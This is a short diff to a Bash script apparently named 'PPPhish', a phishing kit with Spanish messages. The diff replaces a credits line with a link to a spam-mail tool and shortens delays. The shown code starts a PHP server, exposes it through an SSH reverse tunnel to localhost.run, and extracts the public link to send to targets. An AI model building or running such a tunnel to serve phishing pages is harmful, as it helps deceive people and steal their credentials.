@@ -22,8 +22,7 @@ a2(){
 echo -e 
 "PPPhish
 Created by Piter
-Creditos: DeepSociety
-Puedes enviar Emails: http://bypiterrecoursesinformaticos.ibx.lat
+Puedes enviar Emails: https://github.com/Hidden-parker/spammail
 
 "
 
@@ -325,11 +324,11 @@ localrun(){
         
         $(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
         echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
-        sleep 5
+        sleep 2
         echo -e "$v[$b*$v]$b Abriendo local.run..."
-        sleep 5
+        sleep 2
         echo -e "$v[$b*$v]$b Obteniendo links..."
-        sleep 5
+        sleep 2
         envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
         
         if [[ $envialink == "" ]];then
